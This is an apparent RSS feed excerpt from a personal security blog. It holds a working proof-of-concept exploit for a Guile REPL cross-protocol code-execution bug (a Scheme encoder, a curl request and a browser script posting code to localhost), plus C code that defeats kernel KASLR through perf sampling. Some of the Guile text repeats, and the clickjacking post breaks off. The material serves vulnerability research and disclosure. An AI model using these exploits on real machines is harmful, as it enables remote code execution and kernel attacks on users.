ERROR: In procedure module-lookup: Unbound variable: */*

Entering a new prompt.  Type `,bt' for a backtrace or `,q' to continue.
</pre>

<p>
(notice '$44 = "abc def"' in the middle).
</p>

<p>
And then, something more relevant: writing to a file on the host.
</p>

<pre class="example" id="org0e23b3b">
scheme@(guile-user)&gt; (escape '(with-output-to-file "note.txt" (lambda () (display "&gt;:)\n"))))
$9 = "(let((ascii(((lambda(x)x)reverse)(((lambda(x)x)char-set-fold)((lambda(x)x)cons)(((lambda(x)x)make-list)((lambda(x)x)0))((lambda(x)x)char-set:ascii)))))(((lambda(x)x)with-output-to-file)(((lambda(x)x)string)(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)110))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)111))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)116))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)101))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)46))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)116))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)120))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)116)))(lambda()(((lambda(x)x)display)(((lambda(x)x)string)(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)62))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)58))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)41))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)10)))))))"
</pre>


<p>
And finally, from a browser:
</p>

<div class="org-src-container">
<pre class="src src-html">&lt;script&gt;
var host = "http://localhost:37146";
var code = "(let((ascii(((lambda(x)x)reverse)(((lambda(x)x)char-set-fold)((lambda(x)x)cons)(((lambda(x)x)make-list)((lambda(x)x)0))((lambda(x)x)char-set:ascii)))))(((lambda(x)x)with-output-to-file)(((lambda(x)x)string)(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)110))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)111))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)116))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)101))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)46))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)116))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)120))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)116)))(lambda()(((lambda(x)x)display)(((lambda(x)x)string)(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)62))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)58))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)41))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)10)))))))";
window.onload = function () {
	var req = new XMLHttpRequest();
	req.open("GET", host + "/?" + code);
	req.send()
	console.log("sent!");
}
&lt;/script&gt;
</pre>
</div>

<p>
After I visit that page&#x2026;
</p>

<pre class="example" id="org261d67f">
[lizzie@empress lizzie]$ cat note.txt
&gt;:)
</pre>
</div>
</div>
]]></description>
</item>
<item>
<title>Notes about CVE-2016-7117: a use-after-free in the Linux kernel, in recvmmsg.</title>
<link>https://blog.lizzie.io/notes-about-cve-2016-7117.html</link>
<author>_@lizzie.io (Lizzie Dixon)</author>
<guid isPermaLink="false">https://blog.lizzie.io/notes-about-cve-2016-7117.html</guid>
<pubDate>Sat, 15 Oct 2016 13:11:00 -0700</pubDate>

<description><![CDATA[<p>
I saw this recently:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 57: </span><a href="http://www.openwall.com/lists/oss-security/2016/10/11/9"><code>CVE request: GNU Guile &lt;= 2.0.12: REPL server</code></a></label><pre class="src src-text">GNU Guile, an implementation of the Scheme language, provides a “REPL
server” which is a command prompt that developers can connect to for
live coding and debugging purposes.  The REPL server is started by the
‘--listen’ command-line option or equivalent API.

Christopher Allan Webber reported that the REPL server is vulnerable to
the HTTP inter-protocol attack as described at
&lt;https://en.wikipedia.org/wiki/Inter-protocol_exploitation&gt;, notably the
HTML form protocol attack described at
&lt;https://www.jochentopf.com/hfpa/hfpa.pdf&gt;.

This constitutes a remote code execution vulnerability for developers
running a REPL server that listens on a loopback device or private
network.  Applications that do not run a REPL server, as is usually the
case, are unaffected.

Developers can work around this vulnerability by binding the REPL server
to a Unix-domain socket, for instance by running:

  guile --listen=/some/file

A modification to the REPL server that detects attempts to exploit this
vulnerability is available upstream and will be part of Guile 2.0.13, to
be released shortly.
</pre>
</div>

<p>
A cross-protocol attack from browsers to Guile Scheme repls! Exciting.
</p>

<p>
But I've seen a lot of misinformation about this. For example,
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 58: </span><a href="https://lists.gnu.org/archive/html/guile-user/2016-10/msg00007.html"><code>Guile security vulnerability w/ listening on localhost + port (with fix)</code></a></label><pre class="src src-text">The default in Guile has been to expose a port over localhost to which
code may be passed.  The assumption for this is that only a local user
may write to localhost, so it should be safe.  Unfortunately, users
simultaneously developing Guile and operating modern browsers are
vulnerable to a combination of an html form protocol attack [1] and a
DNS rebinding attack [2].  How to combine these attacks is published in
the article "How to steal any developer's local database" [3].

In Guile's case, the general idea is that you visit some site which
presumably loads some javascript code (or tricks the developer into
pressing a button which performs a POST), and the site operator switches
the DNS from their own IP to 127.0.0.1.  Then a POST is done from the
website to 127.0.0.1 with the body containing scheme code.  This code is
then executed by the Guile interpreter on the listening port.
</pre>
</div>

<p>
I'll demonstrate that this does not require DNS rebinding to work. We
can just use <code>XMLHttpRequest</code>.
</p>

<p>
Normally CORS checks happen for <code>XMLHttpRequest</code>. Browsers will make a
request and check if the response indicates, with
<code>Acess-Control-Allow-Origin</code>, that the Javascript context can read it.
That request includes our data! We can just pack some Guile code into
the URL of a GET, and Guile will ignore everything it doesn't understand.
</p>

<p>
There's a hurdle, though: metacharacters in urls will be
percent-escaped. Since Guile doesn't speak URL, we'll have to work
around this. In particular, we need
</p>
<ul class="org-ul">
<li>no double-quotes  (i.e.. string literals)</li>
<li>no backslashes or <code>#</code> (i.e., no char literals)</li>
<li>no whitespace</li>
</ul>

<p>
(additionally, some symbols will be escaped. for example,
<code>integer-&gt;char</code> will have its <code>&gt;</code> escaped. We can just avoid these.)
</p>

<p>
So, we need to transform code to fit these rules. Naturally, I'll
write the transformations in Guile.
</p>
<div id="outline-container-org27c6b6f" class="outline-3">
<h3 id="org27c6b6f">String literals</h3>
<div class="outline-text-3" id="text-org27c6b6f">
<p>
We'll walk the tree and replace the string literal <code>abcd</code> with <code>(string #\a #\b #\c)</code>:
</p>


<div class="org-src-container">
<pre class="src src-scheme">(define (charify form)
  (cond
   [(list? form) (map charify form)]
   [(string? form) `(string ,@(string-&gt;list form))]
   [else form]))
</pre>
</div>

<pre class="example" id="org75a2717">
scheme@(guile-user)&gt; (charify '(string-join (list "abc" "def")))
$3 = (string-join (list (string #\a #\b #\c) (string #\d #\e #\f)))
</pre>
</div>
</div>
<div id="outline-container-org89c62d2" class="outline-3">
<h3 id="org89c62d2">Char literals</h3>
<div class="outline-text-3" id="text-org89c62d2">
<p>
But the number sign in <code>#\a</code> is url-escaped as well. so we'll bind a
list of the characters in ASCII, and replace each letter with an
indexing into it:
</p>

<p>
We'll replace
</p>

<pre class="example">
(list #\a #\b)
</pre>


<p>
with the equivalent of
</p>

<pre class="example" id="orga53ddee">
(let ((ascii "..."))
  (list
	(list-ref ascii 97)
	(list-ref ascii 98)))
</pre>

<p>
Ordinarily, we could just use <code>integer-&gt;char</code>, but <code>&gt;</code> will be percent-escaped.
</p>

<div class="org-src-container">
<pre class="src src-scheme">(define (asciify form)
  (letrec ([inner-asciify
		(lambda (form)
		  (cond
		   [(list? form) (map inner-asciify form)]
		   [(char? form) `(list-ref ascii ,(char-&gt;integer form))]
		   [else form]))])
	`(let ([ascii (reverse (char-set-fold cons (make-list 0) char-set:ascii))])
	   ,(inner-asciify form))))
</pre>
</div>
</div>
</div>
<div id="outline-container-orge1babe4" class="outline-3">
<h3 id="orge1babe4">Spaces</h3>
<div class="outline-text-3" id="text-orge1babe4">
<p>
Finally, we can't have spaces. This is tricky, since we can't just
remove the spaces, because for example <code>(+ 1 2)</code> would become
<code>(+12)</code>. But because there's no need for a space before and after
parens, we can use the identity function, replacing
</p>

<pre class="example">
(+ 1 2)
</pre>


<p>
with
</p>

<pre class="example">
(+ ((lambda (x) x) 1) ((lambda (x) x) 2))
</pre>


<p>
and then the spaces can be removed.
</p>


<div class="org-src-container">
<pre class="src src-scheme">(use-modules (srfi srfi-1))

(define (lambdify form)
  (cond
   [(list? form)
	(cond
	 ;; don't lambdify let or letrec, but lambdify the bindings. ....
	 [(member (first form) '(let letrec let*))
	  `(,(first form)
	    ,(map
	      (lambda (binding)
		`[,(first binding)
		  ,(lambdify (second binding))])
	      (second form))
	    ,@(map lambdify (drop form 2)))]
	 ;; only lambdify the bodies of lambdas
	 [(eq? (first form) 'lambda)
	  `(lambda
	       ,(second form)
	     ,@(map lambdify (drop form 2)))]
	 ;; error on quote, it's tricky to lambdify it.
	 [(eq? (first form) 'quote)
	  (throw 'lambidfy-quote)]
	 ;; otherwise just lambdify everything
	 [else  (map lambdify form)])]
   ;; everything else gets replaced with ((lambda(x)x)y)
   [else `((lambda (x) x) ,form)]))
</pre>
</div>

<pre class="example" id="orgd569068">
scheme@(guile-user)&gt; (lambdify '(+ 1 2))
$11 = (((lambda (x) x) +) ((lambda (x) x) 1) ((lambda (x) x) 2))
scheme@(guile-user)&gt; (lambdify '(let ((a 1)) a))
$12 = (let ((a ((lambda (x) x) 1))) ((lambda (x) x) a))

</pre>
</div>
</div>
<div id="outline-container-orga82c48e" class="outline-3">
<h3 id="orga82c48e">Trying it out</h3>
<div class="outline-text-3" id="text-orga82c48e">
<pre class="example" id="org3e23ff3">
scheme@(guile-user)&gt; (lambdify (asciify (charify '(string-join (list "abc" "def")))))
$15 = (let ((ascii (((lambda (x) x) reverse) (((lambda (x) x) char-set-fold) ((lambda (x) x) cons) (((lambda (x) x) make-list) ((lambda (x) x) 0)) ((lambda (x) x) char-set:ascii))))) (((lambda (x) x) string-join) (((lambda (x) x) list) (((lambda (x) x) string) (((lambda (x) x) list-ref) ((lambda (x) x) ascii) ((lambda (x) x) 97)) (((lambda (x) x) list-ref) ((lambda (x) x) ascii) ((lambda (x) x) 98)) (((lambda (x) x) list-ref) ((lambda (x) x) ascii) ((lambda (x) x) 99))) (((lambda (x) x) string) (((lambda (x) x) list-ref) ((lambda (x) x) ascii) ((lambda (x) x) 100)) (((lambda (x) x) list-ref) ((lambda (x) x) ascii) ((lambda (x) x) 101)) (((lambda (x) x) list-ref) ((lambda (x) x) ascii) ((lambda (x) x) 102))))))
scheme@(guile-user)&gt; (let ((ascii (((lambda (x) x) reverse) (((lambda (x) x) char-set-fold) ((lambda (x) x) cons) (((lambda (x) x) make-list) ((lambda (x) x) 0)) ((lambda (x) x) char-set:ascii))))) (((lambda (x) x) string-join) (((lambda (x) x) list) (((lambda (x) x) string) (((lambda (x) x) list-ref) ((lambda (x) x) ascii) ((lambda (x) x) 97)) (((lambda (x) x) list-ref) ((lambda (x) x) ascii) ((lambda (x) x) 98)) (((lambda (x) x) list-ref) ((lambda (x) x) ascii) ((lambda (x) x) 99))) (((lambda (x) x) string) (((lambda (x) x) list-ref) ((lambda (x) x) ascii) ((lambda (x) x) 100)) (((lambda (x) x) list-ref) ((lambda (x) x) ascii) ((lambda (x) x) 101)) (((lambda (x) x) list-ref) ((lambda (x) x) ascii) ((lambda (x) x) 102))))))
$16 = "abc def"
</pre>

<p>
and putting it all together:
</p>

<div class="org-src-container">
<pre class="src src-scheme">(define (elide-spaces string)
  (string-filter
   (lambda (char) (not (eq? char #\ )))
   string))


(define (escape form)
  (elide-spaces
   (with-output-to-string
	 (lambda ()
	   (write
	    (lambdify (asciify (charify form))))))))
</pre>
</div>


<pre class="example" id="orga2668b4">
scheme@(guile-user)&gt; (escape '(string-join (list  "abc" "def")))
$7 = "(let((ascii(((lambda(x)x)reverse)(((lambda(x)x)char-set-fold)((lambda(x)x)cons)(((lambda(x)x)make-list)((lambda(x)x)0))((lambda(x)x)char-set:ascii)))))(((lambda(x)x)string-join)(((lambda(x)x)list)(((lambda(x)x)string)(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)97))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)98))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)99)))(((lambda(x)x)string)(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)100))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)101))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)102))))))"
scheme@(guile-user)&gt; (let((ascii(((lambda(x)x)reverse)(((lambda(x)x)char-set-fold)((lambda(x)x)cons)(((lambda(x)x)make-list)((lambda(x)x)0))((lambda(x)x)char-set:ascii)))))(((lambda(x)x)string-join)(((lambda(x)x)list)(((lambda(x)x)string)(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)97))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)98))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)99)))(((lambda(x)x)string)(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)100))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)101))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)102))))))
$8 = "abc def"
</pre>


<p>
I started a Guile repl and tried this with <code>curl</code>:
</p>

<pre class="example" id="org19ac094">
[lizzie@empress lizzie]$ guile --listen=37146
GNU Guile 2.0.12
Copyright (C) 1995-2016 Free Software Foundation, Inc.

Guile comes with ABSOLUTELY NO WARRANTY; for details type `,show w'.
This program is free software, and you are welcome to redistribute it
under certain conditions; type `,show c' for details.

Enter `,help' for help.
scheme@(guile-user)&gt;
</pre>

<pre class="example" id="orge7a56f2">
[lizzie@empress lizzie]$ curl "localhost:37146?=(let((ascii(((lambda(x)x)reverse)(((lambda(x)x)char-set-fold)((lambda(x)x)cons)(((lambda(x)x)make-list)((lambda(x)x)0))((lambda(x)x)char-set:ascii)))))(((lambda(x)x)string-join)(((lambda(x)x)list)(((lambda(x)x)string)(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)97))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)98))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)99)))(((lambda(x)x)string)(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)100))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)101))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)102))))))"
GNU Guile 2.0.12
Copyright (C) 1995-2016 Free Software Foundation, Inc.

Guile comes with ABSOLUTELY NO WARRANTY; for details type `,show w'.
This program is free software, and you are welcome to redistribute it
under certain conditions; type `,show c' for details.

Enter `,help' for help.
;;; &lt;unknown-location&gt;: warning: possibly unbound variable `GET'
ERROR: In procedure #&lt;procedure 2253c40 ()&gt;:
ERROR: In procedure module-lookup: Unbound variable: GET

Entering a new prompt.  Type `,bt' for a backtrace or `,q' to continue.
;;; &lt;unknown-location&gt;: warning: possibly unbound variable `/?='
ERROR: In procedure #&lt;procedure 1cbfd40 ()&gt;:
ERROR: In procedure module-lookup: Unbound variable: /?=

Entering a new prompt.  Type `,bt' for a backtrace or `,q' to continue.
$54 = "abc def"
;;; &lt;unknown-location&gt;: warning: possibly unbound variable `HTTP/1.1'
ERROR: In procedure #&lt;procedure 19ceba0 ()&gt;:
ERROR: In procedure module-lookup: Unbound variable: HTTP/1.1

Entering a new prompt.  Type `,bt' for a backtrace or `,q' to continue.
;;; &lt;unknown-location&gt;: warning: possibly unbound variable `Host:'
ERROR: In procedure #&lt;procedure 162c1e0 ()&gt;:
ERROR: In procedure module-lookup: Unbound variable: Host:

Entering a new prompt.  Type `,bt' for a backtrace or `,q' to continue.
;;; &lt;unknown-location&gt;: warning: possibly unbound variable `localhost:37146'
ERROR: In procedure #&lt;procedure 165e720 ()&gt;:
ERROR: In procedure module-lookup: Unbound variable: localhost:37146

Entering a new prompt.  Type `,bt' for a backtrace or `,q' to continue.
;;; &lt;unknown-location&gt;: warning: possibly unbound variable `User-Agent:'
ERROR: In procedure #&lt;procedure 16e2c20 ()&gt;:
ERROR: In procedure module-lookup: Unbound variable: User-Agent:

Entering a new prompt.  Type `,bt' for a backtrace or `,q' to continue.
;;; &lt;unknown-location&gt;: warning: possibly unbound variable `curl/7.50.3'
ERROR: In procedure #&lt;procedure 1769f20 ()&gt;:
ERROR: In procedure module-lookup: Unbound variable: curl/7.50.3

Entering a new prompt.  Type `,bt' for a backtrace or `,q' to continue.
;;; &lt;unknown-location&gt;: warning: possibly unbound variable `Accept:'
ERROR: In procedure #&lt;procedure 17c3b20 ()&gt;:
ERROR: In procedure module-lookup: Unbound variable: Accept:

Entering a new prompt.  Type `,bt' for a backtrace or `,q' to continue.
;;; &lt;unknown-location&gt;: warning: possibly unbound variable `*/*'
ERROR: In procedure #&lt;procedure 17ef5e0 ()&gt;:
ERROR: In procedure module-lookup: Unbound variable: */*

Entering a new prompt.  Type `,bt' for a backtrace or `,q' to continue.
</pre>

<p>
(notice '$44 = "abc def"' in the middle).
</p>

<p>
And then, something more relevant: writing to a file on the host.
</p>

<pre class="example" id="org5ea3228">
scheme@(guile-user)&gt; (escape '(with-output-to-file "note.txt" (lambda () (display "&gt;:)\n"))))
$9 = "(let((ascii(((lambda(x)x)reverse)(((lambda(x)x)char-set-fold)((lambda(x)x)cons)(((lambda(x)x)make-list)((lambda(x)x)0))((lambda(x)x)char-set:ascii)))))(((lambda(x)x)with-output-to-file)(((lambda(x)x)string)(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)110))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)111))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)116))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)101))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)46))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)116))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)120))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)116)))(lambda()(((lambda(x)x)display)(((lambda(x)x)string)(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)62))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)58))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)41))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)10)))))))"
</pre>


<p>
And finally, from a browser:
</p>

<div class="org-src-container">
<pre class="src src-html">&lt;script&gt;
var host = "http://localhost:37146";
var code = "(let((ascii(((lambda(x)x)reverse)(((lambda(x)x)char-set-fold)((lambda(x)x)cons)(((lambda(x)x)make-list)((lambda(x)x)0))((lambda(x)x)char-set:ascii)))))(((lambda(x)x)with-output-to-file)(((lambda(x)x)string)(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)110))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)111))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)116))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)101))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)46))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)116))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)120))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)116)))(lambda()(((lambda(x)x)display)(((lambda(x)x)string)(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)62))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)58))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)41))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)10)))))))";
window.onload = function () {
	var req = new XMLHttpRequest();
	req.open("GET", host + "/?" + code);
	req.send()
	console.log("sent!");
}
&lt;/script&gt;
</pre>
</div>

<p>
After I visit that page&#x2026;
</p>

<pre class="example" id="org2274844">
[lizzie@empress lizzie]$ cat note.txt
&gt;:)
</pre>
</div>
</div>
]]></description>
</item>
<item>
<title>Breaking KASLR with perf</title>
<link>https://blog.lizzie.io/kaslr-and-perf.html</link>
<author>_@lizzie.io (Lizzie Dixon)</author>
<guid isPermaLink="false">https://blog.lizzie.io/kaslr-and-perf.html</guid>
<pubDate>Mon, 27 Mar 2017 20:35:00 -0700</pubDate>

<description><![CDATA[<p>
Before Linux 4.6, the default value of
<code>/proc/sys/kernel/perf_event_paranoid</code> was 1, and so any Linux process
could sample kernel addresses with <a href="http://man7.org/linux/man-pages/man2/perf_event_open.2.html"><code>perf_event_open</code></a>'s
<code>PERF_SAMPLE_IP</code>. So you can break <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization#KASLR">KASLR</a> by sampling the addresses and
taking the mininum.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 59: </span><code>perf_rip_find.c</code></label><pre class="src src-C">/* -*- compile-command: "gcc -Wall perf_rip_find.c -o perf_rip_find" -*- */
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;linux/perf_event.h&gt;
#include &lt;linux/hw_breakpoint.h&gt;
#include &lt;asm/perf_regs.h&gt;
#include &lt;sys/utsname.h&gt;
#include &lt;signal.h&gt;

#define PAGE_SIZE 4096
#define DATA_SIZE PAGE_SIZE
#define MMAP_SIZE (PAGE_SIZE + DATA_SIZE)
#define MASK 0xffffff

int perf_event_open(struct perf_event_attr *attr,
		    pid_t pid,
		    int cpu,
		    int group_fd,
		    unsigned long flags)
{
	return syscall(SYS_perf_event_open, attr, pid, cpu, group_fd, flags);
}


int main (int argc, char **argv)
{
	int return_code = 0;
	int read_fd = -1;
	int fd = -1;

	pid_t child = 0;
	switch ((child = fork())) {
	case -1:
		fprintf(stderr, "fork failed: %m\n");
		goto error;
	case 0:;
		struct utsname self = {0};
		while (1) uname(&amp;self);
		goto cleanup;
	default:
		break;
		
	}
	if ((fd = perf_event_open(
		     &amp; (struct perf_event_attr) {
			.type = PERF_TYPE_SOFTWARE,
			.config = PERF_COUNT_SW_TASK_CLOCK,
			.size = sizeof(struct perf_event_attr),
			.disabled = 1,
			.exclude_user = 1,
			.exclude_hv = 1,
			.sample_type = PERF_SAMPLE_IP,
			.sample_period = 10,
			.precise_ip = 1,
		     }, child, -1, -1, 0)) &lt; 0) {
		fprintf(stderr, "perf_event_open failed!\n");
		goto error;
	}
	struct perf_event_mmap_page *meta_page = NULL;
	if ((meta_page =  mmap(NULL,
			       MMAP_SIZE,
			       PROT_READ | PROT_WRITE,
			       MAP_SHARED,
			       fd, 0)) == MAP_FAILED) {
		fprintf(stderr, "mmap failed: %m\n");
		goto error;
	}
	if (ioctl(fd, PERF_EVENT_IOC_ENABLE)) {
		fprintf(stderr, "ioctl failed: %m\n");
		goto error;
	}
	char *data_page = ((char *) meta_page) + PAGE_SIZE;

	size_t progress = 0;
	uint64_t last_head = 0;
	size_t num_samples = 0;
	uint64_t min = ~0;
	while (num_samples &lt; 100) {
		/* is reading from the meta_page racy? no idea */
		while (meta_page-&gt;data_head == last_head);;
		last_head = meta_page-&gt;data_head;

		while (progress &lt; last_head) {
			struct __attribute__((packed)) sample {
				struct perf_event_header header;
				uint64_t ip;
			} *here = (struct sample *) (data_page + progress % DATA_SIZE);
			switch (here-&gt;header.type) {
			case PERF_RECORD_SAMPLE:
				num_samples++;
				if (here-&gt;header.size &lt; sizeof(*here)) {
					fprintf(stderr, "size too small.\n");
					goto error;
				}
				uint64_t prefix = here-&gt;ip &amp; ~MASK;
				if (prefix &lt; min) min = prefix;
				break;
			case PERF_RECORD_THROTTLE:
			case PERF_RECORD_UNTHROTTLE:
			case PERF_RECORD_LOST:
				break;
			default:
				fprintf(stderr,
                                        "unexpected event: %x\n",
                                        here-&gt;header.type);
				goto error;
			}
			progress += here-&gt;header.size;
		}
		/* tell the kernel we read it. */
		meta_page-&gt;data_tail = last_head;
	}
	fprintf(stderr, "%016lx\n", min);
	goto cleanup;
error:
	return_code =  1;
cleanup:
	if (child) kill(child, SIGKILL);
	if (read_fd &gt; 0) close(read_fd);
	if (fd &gt; 0) close(fd);
	return return_code;
	
}
</pre>
</div>

<p>
You can also sample registers (<code>PERF_SAMPLE_REGS_INTR</code>) , which
worries me, but I couldn't convince it to leak the network secret or
the urandom seed. Probably possible, though. Good luck!
</p>
]]></description>
</item>
<item>
<title>Preventing USB Attacks with Linux-Hardened</title>
<link>https://blog.lizzie.io/preventing-usb-attacks-with-linux-hardened.html</link>
<author>_@lizzie.io (Lizzie Dixon)</author>
<guid isPermaLink="false">https://blog.lizzie.io/preventing-usb-attacks-with-linux-hardened.html</guid>
<pubDate>Fri, 13 Jul 2018 12:06:00 -0700</pubDate>

<description><![CDATA[<p>
In <a href="https://blog.lizzie.io/preventing-usb-attacks-with-grsecurity.html">December 2016</a> I wrote a piece about using Grsecurity to prevent new
USB devices from being loaded. Grsecurity has, unfortunately, <a href="https://lwn.net/Articles/721848/">left
this world</a>, but the <a href="https://github.com/AndroidHardeningArchive/linux-hardened"><code>linux-hardened</code> project</a> has taken on some of the
patches and updates. I thought it would be worth a minor update to
that post <a href="https://github.com/AndroidHardeningArchive/linux-hardened/commit/96dc427ab60d28129b36362e1577b6673b0ba5c4">now that <code>linux-hardened</code> has ported the <code>deny_new_usb</code>
patches</a>, and uses a marginally different <code>sysctl</code> setting.
</p>

<p>
The new systemd service:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 60: </span><code>deny_new_usb.service</code></label><pre class="src src-text">[Unit]
Description=Prevent new USB devices from being loaded

[Service]
Type=oneshot
ExecStart=/usr/bin/sysctl kernel.deny_new_usb=1
ExecStop=/usr/bin/sysctl kernel.deny_new_usb=0
RemainAfterExit=yes

[Install]
WantedBy=default.target suspend.target sleep.target
</pre>
</div>


<p>
...and the new <code>i3status</code> script:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 61: </span><code>status</code></label><pre class="src src-sh">#!/bin/bash

set -e

i3status | while true; do
    read line
    if [ "$(sysctl -n kernel.deny_new_usb)" -eq 1 ];
    then
        usb_status="USB: 🔒"
    else
        usb_status="USB: 🔓"
    fi
    echo "$usb_status | $line"
done
</pre>
</div>
]]></description>
</item>
<item>
<title>Clickjacking Chrome Extensions</title>
<link>https://blog.lizzie.io/clickjacking-privacy-badger.html</link>
<author>_@lizzie.io (Lizzie Dixon)</author>
<guid isPermaLink="false">https://blog.lizzie.io/clickjacking-privacy-badger.html</guid>
<pubDate>Wed, 18 Jul 2018 12:04:00 -0700</pubDate>

<description><![CDATA[<p>
Some webpages embed resources from other domains. Because of the web
browser's storied and sordid history, it's possible for those
resources to carry invisible, ambient authority without their
creators' knowledge.  One concrete example is Cross-Site Request
Forgery: the JavaScript on a particular webpage can make an
<code>XMLHttpRequest</code> to a resource on another domain and the browser will
(in some circumstances) transmit its cookie along with that
<code>XMLHttpRequest</code>. This allows an attacker's website to act with all of
the user's authority on the second domain.
</p>

<p>
Another example is "clickjacking": by visually integrating an embedded
resource into a webpage, for example by creating an iframe and styling
it to be mostly transparent, you can trick a user to click on a button
or link in the embedded document. Because embedded iframes carry ambient
authority from their domains, clicking a button in a transparent
iframe is the same as clicking a button on the original domain. In
this way an attacker can trick a victim into visiting a webpage and
performing some behavior on a webpage on an unrelated domain that they
ordinarily wouldn't.
</p>

<p>
With ordinary webpages the mitigation for clickjacking is to include
<a href="https://en.wikipedia.org/wiki/Clickjacking#Server-side">headers</a> like <code>X-Frame-Options</code> or some <code>Content-Security-Policy</code>
settings in the response from the server. Last year <a href="https://cowlicks.website/">Blake Griffith</a> and
I realized that clickjacking Chrome extensions was possible by
discovering a vulnerability in <a href="https://www.eff.org/privacybadger">PrivacyBadger</a>, a privacy-preserving
browser extension published by the EFF for Chrome and Firefox.
</p>

<p>
Chrome extensions are compressed collections of files. One of those is
a <code>manifest.json</code>; that JSON file has a field
<code>web_accessible_resources</code>. Here's what <a href="https://developer.chrome.com/extensions/manifest/web_accessible_resources">the Chrome docs</a> say about it:
</p>

<blockquote>
<p>
These resources would then be available in a webpage via the URL
<code>chrome-extension://[PACKAGE ID]/[PATH]</code>, which can be generated with
the extension.getURL method. Allowlisted resources are served with
appropriate CORS headers, so they're available via mechanisms like
XHR.
</p>

<p>
A navigation from a web origin to an extension resource will be
blocked unless the resource is listed as web accessible. Note these
corner cases:
</p>

<ul class="org-ul">
<li>When an extension uses the webRequest or declarativeWebRequest APIs to
redirect a public resource request to a resource that is not web
accessible, such request is also blocked.</li>
<li>The above holds true even
if the resource that is not web accessible is owned by the redirecting
extension.</li>
</ul>
</blockquote>

<p>
In addition to being web accessible, the resources in the
